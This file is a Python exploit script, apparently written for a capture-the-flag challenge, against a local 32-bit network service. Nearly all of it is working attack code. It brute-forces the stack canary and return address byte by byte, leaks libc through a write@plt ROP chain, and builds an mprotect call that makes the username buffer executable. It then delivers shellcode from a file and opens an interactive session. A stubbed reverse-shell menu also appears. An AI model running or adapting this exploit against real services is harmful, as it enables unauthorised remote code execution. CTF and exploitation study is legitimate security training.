#!/usr/bin/python3
import select

import sys
import socket as S
from binascii import hexlify, unhexlify
from struct import pack, unpack


# ============================================================
# CTF TARGET
# ============================================================
#
# Goal:
#
#   1. Recover the stack values and binary base.
#   2. Leak a libc address and calculate libc base.
#   3. Build an mprotect() ROP stage.
#   4. Load shellcode from a binary file.
#   5. Place the shellcode at the username address.
#   6. Return to the shellcode after mprotect().
#
# Main stages:
#
#       stack leak
#           |
#           v
#       binary base
#           |
#           v
#       libc leak
#           |
#           v
#       libc base
#           |
#           v
#       mprotect()
#           |
#           v
#       shellcode
#
# ============================================================


HOST = "127.0.0.1"
PORT = 55555

STACK_LEAK_SIZE = 24

RETURN_ADDRESS_OFFSET = 0x1527

PAGE_SIZE = 0x1000

# mmap/mprotect protection flags
PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4

PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC


# ============================================================
# BINARY OFFSETS
# ============================================================

EXO2_WRITE_GOT = 0x00003fc4
EXO2_WRITE_PLT = 0x000010c0

USERNAME_OFFSET = 0x4040


# ============================================================
# KNOWN LIBC OFFSETS
# ============================================================

LIBC_WRITE =  0x00113a70
LIBC_SYSTEM = 0x0004f8e0


# ============================================================
# PACKING HELPERS
# ============================================================

def p32(value):
    return pack("<I", value)


def u32(value):
    return unpack("<I", value)[0]


# ============================================================
# NETWORK
# ============================================================

def oracle(username=b"toto", data=b"", timeout=0.5):
    try:
        s = S.socket(S.AF_INET, S.SOCK_STREAM)

        if timeout:
            s.settimeout(timeout)

        s.connect((HOST, PORT))

        s.send(pack("<H", 0))
        s.send(username)

        hello = s.recv(100)

        s.send(pack("<H", 1))

        buf = b"A" * 1024 + data

        s.send(pack("<H", len(buf)))
        s.send(buf)

        rep = s.recv(len(buf))

        if rep != buf:
            print("[!] Bad pong reply")
            print(f"    expected: {len(buf)} bytes")
            print(f"    received: {len(rep)} bytes")
            s.close()
            return False

        s.send(pack("<H", 2))

        bye = s.recv(100)

        expected_bye = b"Bye " + username

        if bye != expected_bye:
            print("[!] Bad bye reply")
            print("    expected:", repr(expected_bye))
            print("    received:", repr(bye))
            s.close()
            return False

        s.close()
        return True

    except Exception as e:
        print(
            f"[!] oracle exception: "
            f"{type(e).__name__}: {e}"
        )
        return False
def leak_oracle(username=b"toto", data=b"", timeout=0.5):
    """
    Send a payload and return the server response.
    """

    try:
        s = S.socket(S.AF_INET, S.SOCK_STREAM)

        if timeout:
            s.settimeout(timeout)

        s.connect((HOST, PORT))

        # Hello
        s.send(pack("<H", 0))
        s.send(username)

        s.recv(100)

        # Ping-pong
        s.send(pack("<H", 1))

        buf = b"A" * 1024 + data

        s.send(pack("<H", len(buf)))
        s.send(buf)

        rep = s.recv(len(buf))

        s.close()

        return rep

    except Exception as e:
        print("Leak exception:", e)
        return b""


def send_final_payload(username, payload, timeout=2.0):
    """
    Send the final payload and keep the socket alive for
    interactive communication.
    """

    s = S.socket(S.AF_INET, S.SOCK_STREAM)
    s.settimeout(timeout)

    try:
        s.connect((HOST, PORT))

        # ----------------------------------------------------
        # Initial protocol
        # ----------------------------------------------------

        s.sendall(pack("<H", 0))
        s.sendall(username)

        hello = s.recv(100)

        # ----------------------------------------------------
        # Send final overflow
        # ----------------------------------------------------

        s.sendall(pack("<H", 1))

        buf = b"A" * 1024 + payload

        s.sendall(pack("<H", len(buf)))
        s.sendall(buf)

        print("\n[+] Final payload sent.")
        print("[+] Interactive connection starting...\n")

        s.setblocking(False)

        while True:

            readable, _, _ = select.select(
                [s, sys.stdin],
                [],
                [],
            )

            # ------------------------------------------------
            # Target -> terminal
            # ------------------------------------------------

            if s in readable:

                data = s.recv(4096)

                if not data:
                    print(
                        "\n[*] Target closed connection."
                    )
                    break

                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()

            # ------------------------------------------------
            # Terminal -> target
            # ------------------------------------------------

            if sys.stdin in readable:

                command = sys.stdin.buffer.readline()

                if not command:
                    break

                s.sendall(command)

    except KeyboardInterrupt:

        print("\n[*] Interrupted.")

    except Exception as e:

        print(
            f"\n[!] Connection error: "
            f"{type(e).__name__}: {e}"
        )

    finally:

        s.close()
# ============================================================
# STACK LEAK
# ============================================================

def bruteforce_stack(size):
    """
    Recover stack data byte-by-byte using the oracle.
    """

    data = b""

    while len(data) < size:

        found = False

        for value in range(256):

            candidate = data + bytes((value,))

            if oracle(data=candidate):

                data = candidate
                found = True

                print(
                    f"[+] byte {len(data):02d}: "
                    f"{value:#04x}  "
                    f"payload={hexlify(data).decode()}"
                )

                break

        if not found:
            raise RuntimeError(
                f"Could not recover byte {len(data)}"
            )

    return data


def recover_stack_values():
    """
    Recover the stack structure and calculate the
    binary base and username address.
    """

    raw = bruteforce_stack(STACK_LEAK_SIZE)

    values = unpack("<IIIIII", raw)

    (
        canary,
        ebx,
        esi,
        ebp,
        return_addr,
        fd,
    ) = values

    binary_base = (
        return_addr - RETURN_ADDRESS_OFFSET
    )

    username_addr = (
        binary_base + USERNAME_OFFSET
    )

    return {
        "canary": canary,
        "ebx": ebx,
        "esi": esi,
        "ebp": ebp,
        "return_addr": return_addr,
        "fd": fd,

        "binary_base": binary_base,
        "username_addr": username_addr,

        "libc_base": None,

        "shellcode": None,
        "shellcode_path": None,
    }


# ============================================================
# ADDRESS CALCULATIONS
# ============================================================

def calculate_binary_addresses(binary_base):

    return {
        "write_plt":
            binary_base + EXO2_WRITE_PLT,

        "write_got":
            binary_base + EXO2_WRITE_GOT,
    }


def calculate_libc_address(libc_base, offset):

    return libc_base + offset


def align_down(value, alignment):

    return value & ~(alignment - 1)


# ============================================================
# STRUCTURED STACK DATA
# ============================================================

def build_structured_payload(state):
    """
    Reconstruct the original 24-byte stack structure.
    """

    return pack(
        "<IIIIII",

        state["canary"],
        state["ebx"],
        state["esi"],
        state["ebp"],
        state["return_addr"],
        state["fd"],
    )


# ============================================================
# LIBC LEAK
# ============================================================

def build_write_leak_payload(state):
    """
    Build the existing write@plt leak payload.

    Layout:

        canary
        ebx
        esi
        ebp
        write@plt
        fake return
        fd
        buffer
        size
    """

    addresses = calculate_binary_addresses(
        state["binary_base"]
    )

    return pack(
        "<IIIIIIIII",

        state["canary"],
        state["ebx"],
        state["esi"],
        state["ebp"],

        addresses["write_plt"],

        0,                  # fake return

        4,                  # fd

        addresses["write_got"],

        4,                  # size
    )


def leak_libc(state, username):

    payload = build_write_leak_payload(state)

    addresses = calculate_binary_addresses(
        state["binary_base"]
    )

    print("\n=== libc leak ===")

    print(
        "write@plt =",
        f'{addresses["write_plt"]:#010x}'
    )

    print(
        "write@got =",
        f'{addresses["write_got"]:#010x}'
    )

    print(
        "payload =",
        hexlify(payload).decode()
    )

    result = leak_oracle(
        username=username,
        data=payload,
    )

    if len(result) < 4:

        print(
            "[-] Not enough bytes received."
        )

        return None

    leaked_write = u32(result[:4])

    libc_base = (
        leaked_write - LIBC_WRITE
    )

    print(
        "[+] leaked write =",
        f"{leaked_write:#010x}"
    )

    print(
        "[+] libc base    =",
        f"{libc_base:#010x}"
    )

    state["libc_base"] = libc_base

    return libc_base


# ============================================================
# GENERIC FUNCTION PAYLOAD
# ============================================================

def build_function_payload(
    state,
    function_addr,
    arguments,
    return_addr=0,
):
    """
    Build a 32-bit cdecl-style function call.

    Stack layout:

        canary
        ebx
        esi
        ebp

        function_addr
        return_addr

        argument 1
        argument 2
        ...

    Example:

        build_function_payload(
            state,
            mprotect_addr,
            (
                aligned_addr,
                length,
                PROT_RWX,
            ),
            return_addr=username_addr,
        )
    """

    payload = pack(
        "<IIIIII",

        state["canary"],
        state["ebx"],
        state["esi"],
        state["ebp"],

        function_addr,
        return_addr,
    )

    for argument in arguments:

        payload += p32(argument)

    return payload


# ============================================================
# MPROTECT PAYLOAD
# ============================================================

def build_mprotect_payload(state):
    """
    Build the mprotect() ROP stage.

    mprotect signature:

        int mprotect(
            void *addr,
            size_t len,
            int prot
        );

    We want the memory region containing the username/shellcode
    to become executable.

    Conceptually:

        mprotect(
            aligned_addr,
            length,
            PROT_READ | PROT_WRITE | PROT_EXEC
        )

        return -> username_addr
    """

    if state["libc_base"] is None:

        print(
            "[-] libc base is not available."
        )

        return None

    # --------------------------------------------------------
    # Get mprotect offset
    # --------------------------------------------------------

    offset = read_hex_integer(
        "Enter mprotect libc offset: "
    )

    if offset is None:
        return None

    mprotect_addr = (
        state["libc_base"] + offset
    )

    # --------------------------------------------------------
    # Calculate the page containing username_addr
    # --------------------------------------------------------

    target_address = state["username_addr"]

    aligned_addr = align_down(
        target_address,
        PAGE_SIZE,
    )

    # --------------------------------------------------------
    # Calculate the length.
    #
    # We need the range to include username_addr.
    #
    # Round the end upward to the next page boundary.
    # --------------------------------------------------------

    shellcode = state["shellcode"]

    if shellcode is not None:

        end_address = (
            target_address + len(shellcode)
        )

    else:

        # Default one-page region when no shellcode
        # has been loaded yet.
        end_address = (
            target_address + PAGE_SIZE
        )

    aligned_end = (
        (end_address + PAGE_SIZE - 1)
        // PAGE_SIZE
    ) * PAGE_SIZE

    length = aligned_end - aligned_addr

    # --------------------------------------------------------
    # Arguments
    # --------------------------------------------------------

    arguments = (
        aligned_addr,
        length,
        PROT_RWX,
    )

    # --------------------------------------------------------
    # Build ROP call
    # --------------------------------------------------------

    payload = build_function_payload(
        state,
        mprotect_addr,
        arguments,
        return_addr=target_address,
    )

    print("\n=== mprotect stage ===")

    print(
        f"mprotect offset = {offset:#010x}"
    )

    print(
        f"mprotect addr   = {mprotect_addr:#010x}"
    )

    print(
        f"target address  = {target_address:#010x}"
    )

    print(
        f"aligned address = {aligned_addr:#010x}"
    )

    print(
        f"length          = {length:#010x}"
    )

    print(
        f"protection      = {PROT_RWX:#010x}"
    )

    print(
        f"return address  = {target_address:#010x}"
    )

    print(
        "[+] mprotect payload constructed."
    )

    return payload


# ============================================================
# SHELLCODE
# ============================================================

def build_shellcode_payload(state):
    """
    Load shellcode from a binary file.

    The shellcode itself is not placed into the ROP payload.
    It is sent as the username, because username_addr is the
    address where the target stores the username.
    """

    path = input(
        "Enter shellcode .bin path: "
    ).strip()

    if not path:

        print(
            "[-] No shellcode path provided."
        )

        return None

    try:

        with open(path, "rb") as f:
            shellcode = f.read()

    except OSError as e:

        print(
            f"[-] Could not read shellcode: {e}"
        )

        return None

    if not shellcode:

        print(
            "[-] Shellcode file is empty."
        )

        return None

    state["shellcode"] = shellcode
    state["shellcode_path"] = path

    print(
        "\n=== Shellcode ==="
    )

    print(
        f"path = {path}"
    )

    print(
        f"size = {len(shellcode)} bytes"
    )

    print(
        "shellcode =",
        hexlify(shellcode).decode()
    )

    print(
        "\n[+] Shellcode loaded."
    )

    print(
        "[+] It will be sent as the username "
        "during the final attack."
    )

    return shellcode


# ============================================================
# DISPLAY
# ============================================================

def print_state(
    state,
    libc_base=None,
    target_addr=None,
):

    print("\n=== Current state ===")

    if not state:

        print(
            "No stack leak available."
        )

        return

    for name in (
        "canary",
        "ebx",
        "esi",
        "ebp",
        "return_addr",
        "fd",
        "binary_base",
        "username_addr",
    ):

        print(
            f"{name:<15} = "
            f"{state[name]:#010x}"
        )

    if libc_base is not None:

        print(
            f"{'libc_base':<15} = "
            f"{libc_base:#010x}"
        )

    if target_addr is not None:

        print(
            f"{'target_addr':<15} = "
            f"{target_addr:#010x}"
        )

    if state.get("shellcode") is not None:

        print(
            f"{'shellcode_size':<15} = "
            f"{len(state['shellcode'])}"
        )

        print(
            f"{'shellcode_path':<15} = "
            f"{state['shellcode_path']}"
        )


def print_payload(payload):

    if payload is None:

        print(
            "No payload currently selected."
        )

        return

    print(
        f"payload ({len(payload)} bytes):"
    )

    print(
        hexlify(payload).decode()
    )


# ============================================================
# INPUT HELPERS
# ============================================================

def read_hex_payload():

    value = input("> ").strip()

    try:

        return unhexlify(value)

    except ValueError:

        print(
            "Invalid hexadecimal payload."
        )

        return None


def read_hex_integer(prompt):

    value = input(prompt).strip()

    try:

        return int(value, 16)

    except ValueError:

        print(
            "Invalid hexadecimal value."
        )

        return None


# ============================================================
# HIGH-LEVEL FLOWS
# ============================================================

def shellcode_flow(state):
    """
    High-level shellcode workflow.

    Intended sequence:

        1. Make sure stack information is available.
        2. Leak libc.
        3. Load shellcode.
        4. Build the mprotect stage.
        5. Review payload.
        6. Send payload.
    """

    if state is None:
        print("\n[-] Run the stack leak first.")
        return state, None

    # --------------------------------------------------------
    # Step 1: libc leak
    # --------------------------------------------------------

    if state["libc_base"] is None:

        print("\n=== Shellcode flow ===")
        print("[1/4] libc base is not available.")

        answer = input(
            "Leak libc now? [Y/n]: "
        ).strip().lower()

        if answer in ("", "y", "yes"):

            username = input(
                "username for libc leak: "
            ).encode()

            libc_base = leak_libc(
                state,
                username,
            )

            if libc_base is None:
                print("[-] libc leak failed.")
                return state, None

        else:

            print(
                "[-] Shellcode flow requires libc base."
            )

            return state, None

    else:

        print(
            f"[+] libc base already known: "
            f"{state['libc_base']:#010x}"
        )

    # --------------------------------------------------------
    # Step 2: load shellcode
    # --------------------------------------------------------

    print("\n[2/4] Load shellcode")

    shellcode = build_shellcode_payload(
        state
    )

    if shellcode is None:

        print(
            "[-] Shellcode was not loaded."
        )

        return state, None

    # --------------------------------------------------------
    # Step 3: build mprotect stage
    # --------------------------------------------------------

    print("\n[3/4] Build mprotect stage")

    payload = build_mprotect_payload(
        state
    )

    if payload is None:

        print(
            "[-] Could not build mprotect payload."
        )

        return state, None

    # --------------------------------------------------------
    # Step 4: review
    # --------------------------------------------------------

    print("\n[4/4] Payload ready")

    print_payload(payload)

    print(
        "\nShellcode size:",
        len(state["shellcode"]),
        "bytes"
    )

    print(
        "Shellcode location:",
        f'{state["username_addr"]:#010x}'
    )

    answer = input(
        "\nSend final exploit now? [y/N]: "
    ).strip().lower()

    if answer not in ("y", "yes"):

        print(
            "[+] Payload kept in memory."
        )

        return state, payload


    username = state["shellcode"]

    print(
        "\n[+] Sending final exploit..."
    )

    send_final_payload(
        username=username,
        payload=payload,
    )

    return state, payload


def reverse_shell_flow(state):
    """
    High-level reverse-shell workflow.

    This is intentionally kept as a workflow hook rather than
    embedding a target-specific reverse-shell payload here.

    The idea is:

        stack leak
             |
             v
        libc leak
             |
             v
        prepare authorized payload
             |
             v
        review target parameters
             |
             v
        send
    """

    if state is None:

        print(
            "\n[-] Run the stack leak first."
        )

        return state, None

    print("\n=== Reverse shell flow ===")

    print(
        "\nThis flow is separated from the ordinary "
        "shellcode flow."
    )

    print(
        "Use the custom menu to prepare the "
        "target-specific payload."
    )

    print(
        "\nCurrent state:"
    )

    print_state(
        state,
        state.get("libc_base"),
    )

    print(
        "\n[+] Returning to main menu."
    )

    return state, None


# ============================================================
# CUSTOM MENU
# ============================================================

def custom_menu(state, raw_payload):

    while True:

        print("\n")
        print("=== Custom Stuff ===")
        print()

        print("1. Leak libc")
        print("2. Build mprotect payload")
        print("3. Load shellcode from .bin")
        print("4. Build generic function payload")
        print("5. Enter custom raw payload")
        print("6. Show current state")
        print("7. Show current payload")
        print("b. Back")

        choice = input("> ").strip()

        # ----------------------------------------------------
        # BACK
        # ----------------------------------------------------

        if choice == "b":
            return state, raw_payload

        # ----------------------------------------------------
        # LEAK LIBC
        # ----------------------------------------------------

        elif choice == "1":

            if state is None:

                print(
                    "[-] Run the stack leak first."
                )

                continue

            username = input(
                "username: "
            ).encode()

            libc_base = leak_libc(
                state,
                username,
            )

            if libc_base is not None:

                print(
                    "[+] libc base stored in state."
                )

        # ----------------------------------------------------
        # MPROTECT
        # ----------------------------------------------------

        elif choice == "2":

            if state is None:

                print(
                    "[-] Run the stack leak first."
                )

                continue

            if state["libc_base"] is None:

                print(
                    "[-] Leak libc first."
                )

                continue

            raw_payload = build_mprotect_payload(
                state
            )

            if raw_payload is not None:

                print(
                    "\n[+] mprotect payload built."
                )

                print_payload(
                    raw_payload
                )

        # ----------------------------------------------------
        # SHELLCODE
        # ----------------------------------------------------

        elif choice == "3":

            if state is None:

                print(
                    "[-] Run the stack leak first."
                )

                continue

            build_shellcode_payload(
                state
            )

        # ----------------------------------------------------
        # GENERIC FUNCTION
        # ----------------------------------------------------

        elif choice == "4":

            if state is None:

                print(
                    "[-] Run the stack leak first."
                )

                continue

            if state["libc_base"] is None:

                print(
                    "[-] Leak libc first."
                )

                continue

            function_offset = read_hex_integer(
                "Enter libc function offset: "
            )

            if function_offset is None:
                continue

            function_addr = (
                state["libc_base"]
                + function_offset
            )

            try:

                argument_count = int(
                    input(
                        "Number of arguments: "
                    ).strip()
                )

            except ValueError:

                print(
                    "Invalid argument count."
                )

                continue

            arguments = []

            valid = True

            for i in range(argument_count):

                argument = read_hex_integer(
                    f"argument {i + 1}: "
                )

                if argument is None:

                    valid = False
                    break

                arguments.append(
                    argument
                )

            if not valid:
                continue

            fake_return = read_hex_integer(
                "Fake return address: "
            )

            if fake_return is None:
                continue

            raw_payload = build_function_payload(
                state,
                function_addr,
                tuple(arguments),
                return_addr=fake_return,
            )

            print(
                "\n[+] Generic payload built."
            )

            print_payload(
                raw_payload
            )

        # ----------------------------------------------------
        # RAW PAYLOAD
        # ----------------------------------------------------

        elif choice == "5":

            print(
                "\nEnter custom payload as hexadecimal:"
            )

            payload = read_hex_payload()

            if payload is None:
                continue

            raw_payload = payload

            print(
                f"[+] Custom payload loaded "
                f"({len(raw_payload)} bytes)."
            )

            print_payload(
                raw_payload
            )

        # ----------------------------------------------------
        # STATE
        # ----------------------------------------------------

        elif choice == "6":

            print_state(
                state,
                state.get("libc_base")
                if state else None,
            )

        # ----------------------------------------------------
        # PAYLOAD
        # ----------------------------------------------------

        elif choice == "7":

            print_payload(
                raw_payload
            )

        else:

            print(
                "Unknown option."
            )


# ============================================================
# MAIN
# ============================================================

def main():

    print("=== CTF exploit helper ===")
    print()

    state = None
    raw_payload = None

    # --------------------------------------------------------
    # INITIAL SETUP
    # --------------------------------------------------------

    print("=== Initial setup ===")
    print()

    print("1. Run stack leak")
    print("2. Enter custom payload")

    setup = input("> ").strip()

    if setup == "1":

        state = recover_stack_values()

        print_state(
            state
        )

    elif setup == "2":

        print(
            "\nEnter custom payload as hexadecimal:"
        )

        raw_payload = read_hex_payload()

        if raw_payload is None:
            return

        print_payload(
            raw_payload
        )

    else:

        print(
            "Unknown option."
        )

        return

    # ========================================================
    # MAIN MENU
    # ========================================================

    while True:

        print("\n")
        print("========================================")
        print("             MAIN MENU")
        print("========================================")
        print()

        print("1. Show current state")
        print("2. Show current payload")
        print("3. Do shellcode flow")
        print("4. Do reverse shell flow")
        print("5. Do custom stuff")
        print("6. Re-run stack leak")
        print("q. Quit")

        choice = input("> ").strip()

        # ----------------------------------------------------
        # SHOW STATE
        # ----------------------------------------------------

        if choice == "1":

            print_state(
                state,
                state.get("libc_base")
                if state else None,
            )

        # ----------------------------------------------------
        # SHOW PAYLOAD
        # ----------------------------------------------------

        elif choice == "2":

            print_payload(
                raw_payload
            )

        # ----------------------------------------------------
        # SHELLCODE FLOW
        # ----------------------------------------------------

        elif choice == "3":

            state, raw_payload = (
                shellcode_flow(
                    state
                )
            )

        # ----------------------------------------------------
        # REVERSE SHELL FLOW
        # ----------------------------------------------------

        elif choice == "4":

            state, raw_payload = (
                reverse_shell_flow(
                    state
                )
            )

        # ----------------------------------------------------
        # CUSTOM STUFF
        # ----------------------------------------------------

        elif choice == "5":

            state, raw_payload = (
                custom_menu(
                    state,
                    raw_payload,
                )
            )

        # ----------------------------------------------------
        # RE-RUN STACK LEAK
        # ----------------------------------------------------

        elif choice == "6":

            print(
                "\n[+] Re-running stack leak..."
            )

            state = recover_stack_values()

            raw_payload = None

            print_state(
                state
            )
        # ----------------------------------------------------
        # Send Custom Payload
        # ----------------------------------------------------

        elif choice == "7":

            print(
                "\n[+] Sending Custom Payload..."
            )

            

            

            print(
                 oracle(
                    data=raw_payload,
                )
            )
        

        # ----------------------------------------------------
        # QUIT
        # ----------------------------------------------------

        elif choice == "q":

            print(
                "\nBye."
            )

            break

        else:

            print(
                "Unknown option."
            )



if __name__ == "__main__":
    main()